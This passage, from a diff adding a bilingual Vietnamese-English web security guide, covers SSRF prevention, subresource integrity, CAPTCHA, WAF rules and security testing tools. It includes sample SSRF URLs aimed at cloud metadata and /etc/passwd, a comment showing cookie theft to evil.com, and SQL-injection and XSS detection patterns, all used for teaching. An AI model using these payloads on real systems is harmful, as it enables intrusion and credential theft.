+✅ Rate limit 2FA verification (5 attempts/15 minutes)
+✅ Consider SMS 2FA as fallback (nhưng less secure)
+✅ Support multiple 2FA devices
+✅ Send email alert khi 2FA enabled/disabled
+*/
+```
+
+---
+
+### **🚫 8.4. SERVER-SIDE REQUEST FORGERY (SSRF) - Tấn Công SSRF**
+
+**📌 Giải thích:** SSRF là khi hacker trick server gửi request đến internal resources
+
+**Ví dụ tấn công:**
+
+```typescript
+// ❌ VULNERABLE CODE
+app.get('/api/fetch-image', async (req, res) => {
+  const { url } = req.query;
+
+  // Hacker có thể:
+  // /api/fetch-image?url=http://localhost:6379 (Redis)
+  // /api/fetch-image?url=http://169.254.169.254/latest/meta-data (AWS metadata)
+  // /api/fetch-image?url=file:///etc/passwd (Local files)
+
+  const response = await fetch(url); // ❌ SSRF vulnerability!
+  const data = await response.text();
+  res.send(data);
+});
+```
+
+**✅ Giải pháp:**
+
+```typescript
+// =====================================
+// SSRF PREVENTION
+// =====================================
+
+import { URL } from 'url';
+import dns from 'dns/promises';
+
+// 🛡️ A. Whitelist Allowed Domains
+const ALLOWED_DOMAINS = [
+  'api.example.com',
+  'cdn.example.com',
+  's3.amazonaws.com',
+];
+
+async function isAllowedURL(urlString: string): Promise<boolean> {
+  try {
+    const url = new URL(urlString);
+
+    // ✅ Check 1: Only HTTPS
+    if (url.protocol !== 'https:') {
+      return false;
+    }
+
+    // ✅ Check 2: Whitelist domain
+    const hostname = url.hostname;
+    if (!ALLOWED_DOMAINS.includes(hostname)) {
+      return false;
+    }
+
+    // ✅ Check 3: Resolve DNS → check không phải internal IP
+    const addresses = await dns.resolve4(hostname);
+
+    for (const ip of addresses) {
+      if (isPrivateIP(ip)) {
+        console.log(
+          `❌ SSRF attempt: ${hostname} resolves to private IP ${ip}`
+        );
+        return false;
+      }
+    }
+
+    return true;
+  } catch (error) {
+    return false;
+  }
+}
+
+// 🛡️ B. Check Private IP Ranges
+function isPrivateIP(ip: string): boolean {
+  const parts = ip.split('.').map(Number);
+
+  // 10.0.0.0/8
+  if (parts[0] === 10) return true;
+
+  // 172.16.0.0/12
+  if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
+
+  // 192.168.0.0/16
+  if (parts[0] === 192 && parts[1] === 168) return true;
+
+  // 127.0.0.0/8 (localhost)
+  if (parts[0] === 127) return true;
+
+  // 169.254.0.0/16 (link-local)
+  if (parts[0] === 169 && parts[1] === 254) return true;
+
+  // 0.0.0.0/8
+  if (parts[0] === 0) return true;
+
+  return false;
+}
+
+// 🛡️ C. Secure Fetch Implementation
+app.get('/api/fetch-image', authenticateToken, async (req, res) => {
+  const { url } = req.query;
+
+  if (!url || typeof url !== 'string') {
+    return res.status(400).json({ error: 'Invalid URL' });
+  }
+
+  // ✅ Validate URL
+  const isAllowed = await isAllowedURL(url);
+  if (!isAllowed) {
+    console.log(`⚠️ SSRF attempt blocked: ${url}`);
+    return res.status(403).json({ error: 'URL not allowed' });
+  }
+
+  try {
+    // ✅ Fetch với timeout
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000); // 5s timeout
+
+    const response = await fetch(url, {
+      signal: controller.signal,
+      // ✅ Limit redirects
+      redirect: 'manual',
+    });
+
+    clearTimeout(timeout);
+
+    // ✅ Check response size
+    const contentLength = response.headers.get('content-length');
+    if (contentLength && parseInt(contentLength) > 5 * 1024 * 1024) {
+      return res.status(413).json({ error: 'File too large' });
+    }
+
+    // ✅ Validate content type
+    const contentType = response.headers.get('content-type');
+    if (!contentType?.startsWith('image/')) {
+      return res.status(400).json({ error: 'Not an image' });
+    }
+
+    const buffer = await response.arrayBuffer();
+    res.contentType(contentType);
+    res.send(Buffer.from(buffer));
+  } catch (error) {
+    if (error.name === 'AbortError') {
+      return res.status(408).json({ error: 'Request timeout' });
+    }
+    res.status(500).json({ error: 'Fetch failed' });
+  }
+});
+
+// 📊 SSRF PREVENTION CHECKLIST
+/*
+✅ Whitelist allowed domains/IPs
+✅ Block private IP ranges (10.x.x.x, 192.168.x.x, 127.0.0.1)
+✅ Block AWS metadata endpoint (169.254.169.254)
+✅ Resolve DNS before fetching (check IP)
+✅ Only allow HTTP/HTTPS protocols
+✅ Disable redirects or limit to 3 max
+✅ Set request timeout (5-10 seconds)
+✅ Validate response content-type
+✅ Limit response size
+✅ Log suspicious requests
+*/
+```
+
+---
+
+### **🔐 8.5. SUBRESOURCE INTEGRITY (SRI) - Xác Minh Tài Nguyên**
+
+**📌 Vấn Đề:** CDN bị hack → file JavaScript bị sửa → inject malicious code
+
+**✅ Giải pháp:** SRI = Verify file hash trước khi execute
+
+```html
+<!-- =====================================
+     SUBRESOURCE INTEGRITY (SRI)
+     ===================================== -->
+
+<!-- ❌ KHÔNG AN TOÀN: Không có integrity check -->
+<script src="https://cdn.example.com/library.js"></script>
+
+<!-- Nếu CDN bị hack:
+     library.js → inject: fetch('https://evil.com?cookie='+document.cookie)
+     → Tất cả websites dùng CDN này bị hack!
+-->
+
+<!-- ✅ AN TOÀN: Có SRI integrity check -->
+<script
+  src="https://cdn.example.com/library.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux"
+  crossorigin="anonymous"
+></script>
+
+<!--
+  integrity="sha384-..."
+  - Browser tính hash của file
+  - So sánh với hash trong integrity attribute
+  - Nếu khác nhau → BLOCK file → script không chạy
+  - Nếu CDN bị hack và file thay đổi → hash khác → blocked!
+-->
+
+<!-- ✅ Ví dụ với React từ CDN -->
+<script
+  src="https://unpkg.com/react@18/umd/react.production.min.js"
+  integrity="sha384-cPJnyRZOYk8WjQbB6nBp9Iw0VgK6k7KkW6w3YwZ3C8nBp9Iw0VgK6k7KkW6w3YwZ"
+  crossorigin="anonymous"
+></script>
+
+<!-- ✅ Multiple hashes (fallback algorithms) -->
+<script
+  src="https://cdn.example.com/library.js"
+  integrity="sha256-abc123... sha384-def456... sha512-ghi789..."
+  crossorigin="anonymous"
+></script>
+```
+
+**🛠️ Generate SRI Hash:**
+
+```bash
+# Command line
+cat library.js | openssl dgst -sha384 -binary | openssl base64 -A
+
+# Output: oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux...
+```
+
+```typescript
+// Node.js
+import crypto from 'crypto';
+import fs from 'fs';
+
+function generateSRIHash(
+  filePath: string,
+  algorithm: 'sha256' | 'sha384' | 'sha512' = 'sha384'
+): string {
+  const fileBuffer = fs.readFileSync(filePath);
+  const hash = crypto.createHash(algorithm).update(fileBuffer).digest('base64');
+  return `${algorithm}-${hash}`;
+}
+
+// Usage
+const sriHash = generateSRIHash('./library.js', 'sha384');
+console.log(`integrity="${sriHash}"`);
+// Output: integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
+```
+
+**📊 SRI Best Practices:**
+
+```typescript
+/*
+✅ Always use SRI for third-party CDN files
+✅ Use sha384 or sha512 (sha256 acceptable but weaker)
+✅ Include crossorigin="anonymous" attribute
+✅ Consider using multiple hashes for algorithm agility
+✅ Update hashes when updating library versions
+✅ Use tools: https://www.srihash.org/
+❌ Don't use SRI for self-hosted files (unnecessary)
+❌ Don't use SRI with dynamic content
+*/
+```
+
+---
+
+### **🤖 8.6. CAPTCHA IMPLEMENTATION - Chống Bot**
+
+**📌 Use cases:**
+
+- Login form (chống brute-force)
+- Registration form (chống spam accounts)
+- Contact form (chống spam messages)
+- Password reset (chống account enumeration)
+
+```typescript
+// =====================================
+// GOOGLE reCAPTCHA v3 IMPLEMENTATION
+// =====================================
+
+// 🤖 A. Frontend Implementation (React)
+import { useEffect, useState } from 'react';
+
+// Load reCAPTCHA script
+function loadReCaptchaScript() {
+  const script = document.createElement('script');
+  script.src = `https://www.google.com/recaptcha/api.js?render=${RECAPTCHA_SITE_KEY}`;
+  document.head.appendChild(script);
+}
+
+function LoginForm() {
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+
+  useEffect(() => {
+    loadReCaptchaScript();
+  }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    try {
+      // ✅ Execute reCAPTCHA
+      const token = await window.grecaptcha.execute(RECAPTCHA_SITE_KEY, {
+        action: 'login' // Action name (để phân tích)
+      });
+
+      // ✅ Send token to backend
+      const res = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          password,
+          recaptchaToken: token // ✅ Include reCAPTCHA token
+        })
+      });
+
+      const data = await res.json();
+
+      if (data.accessToken) {
+        authStore.setAccessToken(data.accessToken);
+        navigate('/dashboard');
+      }
+
+    } catch (error) {
+      console.error('Login error:', error);
+    }
+  };
+
+  return (
+    <form onSubmit={handleSubmit}>
+      <input
+        type="email"
+        placeholder="Email"
+        value={email}
+        onChange={(e) => setEmail(e.target.value)}
+      />
+      <input
+        type="password"
+        placeholder="Password"
+        value={password}
+        onChange={(e) => setPassword(e.target.value)}
+      />
+      <button type="submit">Login</button>
+
+      {/* reCAPTCHA badge (auto-displayed) */}
+    </form>
+  );
+}
+
+// 🤖 B. Backend Verification
+import axios from 'axios';
+
+interface RecaptchaResponse {
+  success: boolean;
+  score: number; // 0.0 - 1.0 (1.0 = definitely human, 0.0 = definitely bot)
+  action: string;
+  challenge_ts: string;
+  hostname: string;
+  'error-codes'?: string[];
+}
+
+async function verifyRecaptcha(token: string, expectedAction: string): Promise<boolean> {
+  try {
+    // ✅ Call Google reCAPTCHA API
+    const response = await axios.post<RecaptchaResponse>(
+      'https://www.google.com/recaptcha/api/siteverify',
+      null,
+      {
+        params: {
+          secret: process.env.RECAPTCHA_SECRET_KEY,
+          response: token
+        }
+      }
+    );
+
+    const data = response.data;
+
+    // ✅ Check success
+    if (!data.success) {
+      console.log('❌ reCAPTCHA verification failed:', data['error-codes']);
+      return false;
+    }
+
+    // ✅ Check action matches
+    if (data.action !== expectedAction) {
+      console.log(`❌ Action mismatch: expected ${expectedAction}, got ${data.action}`);
+      return false;
+    }
+
+    // ✅ Check score (0.0 - 1.0)
+    // - 1.0: Definitely human
+    // - 0.5: Suspicious
+    // - 0.0: Definitely bot
+    const threshold = 0.5; // Adjust based on your needs
+
+    if (data.score < threshold) {
+      console.log(`⚠️ Low reCAPTCHA score: ${data.score} (threshold: ${threshold})`);
+      return false;
+    }
+
+    console.log(`✅ reCAPTCHA passed: score ${data.score}`);
+    return true;
+
+  } catch (error) {
+    console.error('reCAPTCHA verification error:', error);
+    return false; // Fail securely
+  }
+}
+
+// 🤖 C. Login with CAPTCHA Verification
+app.post('/api/login', async (req, res) => {
+  const { email, password, recaptchaToken } = req.body;
+
+  // ✅ Verify reCAPTCHA
+  const isHuman = await verifyRecaptcha(recaptchaToken, 'login');
+
+  if (!isHuman) {
+    return res.status(403).json({
+      error: 'reCAPTCHA verification failed. Are you a bot?'
+    });
+  }
+
+  // ✅ Continue with login logic
+  const user = await db.users.findOne({ email });
+  // ... rest of login logic
+});
+
+// 📊 reCAPTCHA v3 vs v2
+
+/*
+┌──────────────────┬────────────────────────────────────────────────────┐
+│  reCAPTCHA v2    │  reCAPTCHA v3                                     │
+├──────────────────┼────────────────────────────────────────────────────┤
+│  ✅ Checkbox      │  ✅ No user interaction                            │
+│  ✅ Challenge     │  ✅ Score-based (0.0 - 1.0)                        │
+│  ❌ UX impact     │  ✅ Better UX (invisible)                          │
+│  ✅ Clear result  │  ⚠️ Requires threshold tuning                     │
+│  Use: Forms      │  Use: All interactions (login, submit, checkout)  │
+└──────────────────┴────────────────────────────────────────────────────┘
+*/
+
+// 🤖 D. Alternative: hCaptcha (GDPR-compliant)
+// hCaptcha tương tự reCAPTCHA nhưng privacy-focused
+
+// Frontend
+<script src="https://hcaptcha.com/1/api.js" async defer></script>
+<div class="h-captcha" data-sitekey="your-site-key"></div>
+
+// Backend
+const response = await axios.post('https://hcaptcha.com/siteverify', {
+  secret: process.env.HCAPTCHA_SECRET,
+  response: req.body.hcaptchaToken
+});
+```
+
+---
+
+### **🛡️ 8.7. WEB APPLICATION FIREWALL (WAF) - Tường Lửa Web**
+
+**📌 Định nghĩa:** WAF = firewall bảo vệ web app khỏi các attacks (XSS, SQL injection, DDoS)
+
+**🔧 Implementation với Cloudflare WAF:**
+
+```typescript
+// =====================================
+// CLOUDFLARE WAF SETUP
+// =====================================
+
+/*
+📊 Cloudflare WAF Features:
+
+1️⃣ Managed Rulesets
+   - OWASP Core Rule Set
+   - Cloudflare Managed Ruleset
+   - Auto-block XSS, SQL injection, RCE
+
+2️⃣ Rate Limiting
+   - Limit requests per IP
+   - Custom rules per endpoint
+
+3️⃣ DDoS Protection
+   - Layer 3/4 DDoS mitigation
+   - Layer 7 (application) DDoS protection
+
+4️⃣ Bot Management
+   - Block malicious bots
+   - Allow good bots (Google, Bing)
+
+5️⃣ Custom Rules
+   - Block by country
+   - Block by IP
+   - Custom firewall rules
+*/
+
+// ✅ A. Cloudflare Custom Rule Examples
+// (Configure trong Cloudflare Dashboard → Security → WAF)
+
+// Rule 1: Block SQL injection attempts
+// (http.request.uri.query contains "' OR '1'='1" or http.request.body contains "UNION SELECT")
+
+// Rule 2: Rate limit login endpoint
+// (http.request.uri.path eq "/api/login" and rate(1m) > 5)
+
+// Rule 3: Block by country
+// (ip.geoip.country in {"CN" "RU" "KP"})
+
+// Rule 4: Allow only specific User-Agents
+// (not http.user_agent contains "Mozilla" and not http.user_agent contains "Chrome")
+
+// ✅ B. AWS WAF Implementation
+import {
+  WAFv2Client,
+  CreateWebACLCommand,
+  CreateRuleGroupCommand,
+} from '@aws-sdk/client-wafv2';
+
+const wafClient = new WAFv2Client({ region: 'us-east-1' });
+
+// Create WAF Web ACL
+const createWAF = async () => {
+  const command = new CreateWebACLCommand({
+    Name: 'MyWebACL',
+    Scope: 'REGIONAL', // or 'CLOUDFRONT'
+    DefaultAction: { Allow: {} }, // Default allow
+
+    Rules: [
+      {
+        Name: 'RateLimitRule',
+        Priority: 1,
+        Statement: {
+          RateBasedStatement: {
+            Limit: 2000, // 2000 requests per 5 minutes
+            AggregateKeyType: 'IP',
+          },
+        },
+        Action: { Block: {} },
+        VisibilityConfig: {
+          SampledRequestsEnabled: true,
+          CloudWatchMetricsEnabled: true,
+          MetricName: 'RateLimitRule',
+        },
+      },
+      {
+        Name: 'SQLInjectionRule',
+        Priority: 2,
+        Statement: {
+          SqliMatchStatement: {
+            FieldToMatch: {
+              QueryString: {},
+            },
+            TextTransformations: [
+              { Priority: 0, Type: 'URL_DECODE' },
+              { Priority: 1, Type: 'HTML_ENTITY_DECODE' },
+            ],
+          },
+        },
+        Action: { Block: {} },
+        VisibilityConfig: {
+          SampledRequestsEnabled: true,
+          CloudWatchMetricsEnabled: true,
+          MetricName: 'SQLInjectionRule',
+        },
+      },
+      {
+        Name: 'XSSRule',
+        Priority: 3,
+        Statement: {
+          XssMatchStatement: {
+            FieldToMatch: {
+              AllQueryArguments: {},
+            },
+            TextTransformations: [
+              { Priority: 0, Type: 'URL_DECODE' },
+              { Priority: 1, Type: 'HTML_ENTITY_DECODE' },
+            ],
+          },
+        },
+        Action: { Block: {} },
+        VisibilityConfig: {
+          SampledRequestsEnabled: true,
+          CloudWatchMetricsEnabled: true,
+          MetricName: 'XSSRule',
+        },
+      },
+    ],
+
+    VisibilityConfig: {
+      SampledRequestsEnabled: true,
+      CloudWatchMetricsEnabled: true,
+      MetricName: 'MyWebACL',
+    },
+  });
+
+  const response = await wafClient.send(command);
+  console.log('✅ WAF Created:', response.Summary);
+};
+
+// ✅ C. Application-Level WAF (Express Middleware)
+import { expressjwt } from 'express-jwt';
+
+// WAF Middleware
+const wafMiddleware = (req: Request, res: Response, next: NextFunction) => {
+  const ip = req.ip;
+  const url = req.url;
+  const body = JSON.stringify(req.body);
+
+  // ✅ Check 1: SQL Injection patterns
+  const sqlPattern =
+    /(\bOR\b|\bAND\b).*=.*|UNION|SELECT|DROP|DELETE|INSERT|UPDATE/i;
+  if (sqlPattern.test(url) || sqlPattern.test(body)) {
+    console.log(`⚠️ SQL Injection attempt from ${ip}: ${url}`);
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+
+  // ✅ Check 2: XSS patterns
+  const xssPattern = /<script|javascript:|onerror=|onclick=/i;
+  if (xssPattern.test(url) || xssPattern.test(body)) {
+    console.log(`⚠️ XSS attempt from ${ip}`);
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+
+  // ✅ Check 3: Path traversal
+  if (url.includes('../') || url.includes('..\\')) {
+    console.log(`⚠️ Path traversal attempt from ${ip}: ${url}`);
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+
+  // ✅ Check 4: Blocked IPs
+  const BLOCKED_IPS = ['1.2.3.4', '5.6.7.8'];
+  if (BLOCKED_IPS.includes(ip)) {
+    console.log(`⚠️ Blocked IP attempted access: ${ip}`);
+    return res.status(403).json({ error: 'Your IP is blocked' });
+  }
+
+  next();
+};
+
+// Apply WAF middleware globally
+app.use(wafMiddleware);
+
+// 📊 WAF BEST PRACTICES
+/*
+✅ Use managed rule sets (OWASP Core Rule Set)
+✅ Enable rate limiting per endpoint
+✅ Log all blocked requests
+✅ Whitelist known good IPs (office, CI/CD)
+✅ Tune rules to reduce false positives
+✅ Monitor WAF metrics (blocked requests, false positives)
+✅ Combine with DDoS protection
+✅ Use CDN + WAF (Cloudflare, AWS CloudFront)
+❌ Don't rely solely on WAF (defense in depth)
+❌ Don't block legitimate traffic (test thoroughly)
+*/
+```
+
+---
+
+### **🔍 8.8. SECURITY TESTING TOOLS - Công Cụ Test Bảo Mật**
+
+```typescript
+// =====================================
+// SECURITY TESTING & SCANNING
+// =====================================
+
+/*
+🛠️ Security Testing Tools:
+
+1️⃣ OWASP ZAP (Zed Attack Proxy)
+   - Free, open-source
+   - Automated security scanning
+   - Find XSS, SQL injection, CSRF
+   - https://www.zaproxy.org/
+
+2️⃣ Burp Suite
+   - Industry standard
+   - Manual + automated testing
+   - Powerful scanner
+   - https://portswigger.net/burp
+
+3️⃣ Nmap
+   - Network scanner
+   - Port scanning
+   - Service detection
+
+4️⃣ Nikto
+   - Web server scanner
+   - Find misconfigurations
+   - Check for outdated software
+
+5️⃣ SQLMap
+   - Automated SQL injection tool
+   - Test database security
+
+6️⃣ OWASP Dependency-Check
+   - Scan dependencies for vulnerabilities
+   - NPM audit, Snyk alternative
+
+7️⃣ SSL Labs
+   - Test TLS/SSL configuration
+   - https://www.ssllabs.com/ssltest/
+
+8️⃣ SecurityHeaders.com
+   - Scan security headers
+   - https://securityheaders.com/
+*/
+
+// 🔧 A. Automated Security Testing với npm audit
+// package.json scripts
+{
+  "scripts": {
+    "audit": "npm audit",
+    "audit:fix": "npm audit fix",
+    "audit:force": "npm audit fix --force"
+  }
+}
+
+// CI/CD pipeline (GitHub Actions)
+// .github/workflows/security.yml
+name: Security Scan
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Run npm audit
+        run: npm audit --audit-level=high
+
+      - name: Run OWASP Dependency-Check
+        uses: dependency-check/Dependency-Check_Action@main
+        with:
+          project: 'my-project'
+          path: '.'
+          format: 'HTML'
+
+      - name: Upload Results
+        uses: actions/upload-artifact@v3
+        with:
+          name: dependency-check-report
+          path: dependency-check-report.html
+
+// 🔧 B. Snyk Integration (Vulnerability Scanning)
+import snyk from 'snyk';
+
+async function scanDependencies() {
+  const results = await snyk.test('./package.json', {
+    org: 'my-org',
+    'package-manager': 'npm'
+  });
+
+  console.log('Vulnerabilities found:', results.vulnerabilities.length);
+
+  results.vulnerabilities.forEach(vuln => {
+    console.log(`- ${vuln.title} (${vuln.severity})`);
+    console.log(`  Package: ${vuln.packageName}@${vuln.version}`);
+    console.log(`  Fix: ${vuln.upgradePath.join(' → ')}`);
+  });
+}
+
+// 🔧 C. OWASP ZAP Automated Scan
+// zap-scan.js
+const ZapClient = require('zaproxy');
+
+async function runZAPScan(targetUrl) {
+  const zaproxy = new ZapClient({
+    apiKey: process.env.ZAP_API_KEY,
+    proxy: 'http://localhost:8080'
+  });
+
+  console.log('🔍 Starting ZAP scan...');
+
+  // Spider (crawl website)
+  await zaproxy.spider.scan(targetUrl);
+
+  // Active scan (attack)
+  const scanId = await zaproxy.ascan.scan(targetUrl);
+
+  // Wait for scan to complete
+  let status = 0;
+  while (status < 100) {
+    await new Promise(resolve => setTimeout(resolve, 5000));
+    status = await zaproxy.ascan.status(scanId);
+    console.log(`Scan progress: ${status}%`);
+  }
+
+  // Get results
+  const alerts = await zaproxy.core.alerts(targetUrl);
+
+  console.log(`✅ Scan complete. Found ${alerts.length} issues:`);
+
+  alerts.forEach(alert => {
+    console.log(`- [${alert.risk}] ${alert.alert}`);
+    console.log(`  URL: ${alert.url}`);
+    console.log(`  Description: ${alert.description}`);
+    console.log(`  Solution: ${alert.solution}`);
+  });
+}
+
+// 🔧 D. Security Headers Check Script
+async function checkSecurityHeaders(url: string) {
+  const response = await fetch(url);
+  const headers = response.headers;
+
+  const securityHeaders = {
+    'strict-transport-security': headers.get('strict-transport-security'),
+    'content-security-policy': headers.get('content-security-policy'),
+    'x-frame-options': headers.get('x-frame-options'),
+    'x-content-type-options': headers.get('x-content-type-options'),
+    'referrer-policy': headers.get('referrer-policy'),
+    'permissions-policy': headers.get('permissions-policy')
+  };
+
+  console.log('🔐 Security Headers:');
+  Object.entries(securityHeaders).forEach(([header, value]) => {
+    if (value) {
+      console.log(`✅ ${header}: ${value}`);
+    } else {
+      console.log(`❌ ${header}: MISSING`);
+    }
+  });
+}
+
+// Usage
+checkSecurityHeaders('https://yourwebsite.com');
+
+// 📊 SECURITY TESTING CHECKLIST
+/*
+✅ Run npm audit regularly (CI/CD)
+✅ Use Snyk/Dependabot for dependency vulnerabilities
+✅ Scan with OWASP ZAP before production deploy
+✅ Test TLS/SSL configuration (SSL Labs)
+✅ Verify security headers (securityheaders.com)
+✅ Penetration testing (hire security experts)
+✅ Bug bounty program (HackerOne, Bugcrowd)
+✅ Security code review
+✅ SAST (Static Analysis) tools
+✅ DAST (Dynamic Analysis) tools
+*/
+```
+
+---
+
+## **🎓 TỔNG KẾT - Security Mindset**
+
+### **🧠 Defense in Depth (Phòng Thủ Nhiều Tầng)**
+
+```
+┌────────────────────────────────────────────────────────────────┐
+│                    SECURITY LAYERS                              │
+├────────────────────────────────────────────────────────────────┤
+│  🌐 Network Layer:    Firewall, WAF, DDoS protection           │
+│  🔒 Transport Layer:  HTTPS/TLS 1.3, Certificate pinning       │
+│  🔐 Application:      Input validation, Output encoding         │
+│  👤 Authentication:   2FA, OAuth, JWT, Session management       │
+│  🔑 Authorization:    RBAC, Least privilege                     │
+│  💾 Data:             Encryption at rest, Hashing passwords     │
+│  📝 Logging:          Security events, Anomaly detection        │
+│  🧪 Testing:          Penetration testing, Vulnerability scans  │
+└────────────────────────────────────────────────────────────────┘
+```
+
+### **✅ Security Best Practices Summary**
+
+1. **NEVER trust user input** - Validate everything server-side
+2. **Use HTTPS everywhere** - No exceptions, even for non-sensitive sites
+3. **Hash passwords** - bcrypt/argon2, NEVER encrypt passwords
+4. **Use HttpOnly cookies** - For refresh tokens
+5. **Implement CSRF protection** - Tokens for state-changing operations
+6. **Enable CSP headers** - Prevent XSS attacks
+7. **Rate limit** - All APIs, especially auth endpoints
+8. **Use prepared statements** - Prevent SQL injection
+9. **Keep dependencies updated** - npm audit, Snyk, Dependabot
+10. **Log security events** - Failed logins, XSS attempts, SQL injection
+11. **Implement 2FA** - For sensitive operations
+12. **Use SRI for CDN files** - Verify integrity
+13. **Validate file uploads** - MIME type + magic number + virus scan
+14. **Store secrets in env vars** - Never hardcode in source
+15. **Principle of least privilege** - Minimal permissions
+16. **Regular security audits** - Penetration testing, code reviews
+17. **Educate developers** - Security training, OWASP Top 10
+18. **Have incident response plan** - Know what to do when breached
+
+### **🚨 OWASP Top 10 (2021) - Must Know**
+
+1. **A01:2021-Broken Access Control** - IDOR, missing auth checks
+2. **A02:2021-Cryptographic Failures** - Weak encryption, exposed secrets
+3. **A03:2021-Injection** - SQL, NoSQL, Command injection
+4. **A04:2021-Insecure Design** - Flawed architecture
+5. **A05:2021-Security Misconfiguration** - Default configs, verbose errors
+6. **A06:2021-Vulnerable Components** - Outdated libraries
+7. **A07:2021-Identification and Authentication Failures** - Weak auth
+8. **A08:2021-Software and Data Integrity Failures** - Unsigned code, supply chain
+9. **A09:2021-Security Logging and Monitoring Failures** - No logs, no alerts
+10. **A10:2021-Server-Side Request Forgery (SSRF)** - Unvalidated URLs
+
+### **📚 Learning Resources**
+
+- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
+- **Web Security Academy**: https://portswigger.net/web-security
+- **Hack The Box**: https://www.hackthebox.eu/
+- **CTF Challenges**: https://ctftime.org/
+- **Security Headers**: https://securityheaders.com/
+- **SSL Labs**: https://www.ssllabs.com/ssltest/
+
+---
+
+**🎯 Remember:**
+
+> "Security is not a product, but a process." - Bruce Schneier
+
+> "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." - Gene Spafford
+
+**✅ Good security = Layers + Education + Monitoring + Testing**
